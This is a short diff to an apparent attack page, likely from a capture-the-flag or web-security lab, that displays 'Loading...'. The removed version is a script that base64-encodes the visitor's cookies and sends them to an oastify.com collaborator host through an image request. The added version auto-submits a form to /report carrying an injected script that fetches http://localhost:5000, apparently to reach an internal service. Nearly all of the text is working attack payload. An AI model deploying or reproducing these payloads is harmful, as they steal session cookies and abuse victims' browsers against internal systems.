@@ -7,11 +7,11 @@
 </head>
 <body>
     <h1>Loading...</h1>
-    <script>
-        var token = document.cookie;
-        var img = new Image();
-        img.src = "https://hey"+btoa(token)+".s70u7dk47jg8yaz4lyet8ot1vs1lpbd0.oastify.com";
-        document.body.appendChild(img);
-    </script>
+    <form action="/report" method="POST">
+    <input type="hidden" name="data" value="<script>fetch('http://localhost:5000').then(res => res.text()).then(data => document.querySelector('input[name=data]').value = data)</script>">
+    <input type="submit">
+</form>
+
+<script>document.forms[0].submit();</script>
 </body>
 </html>
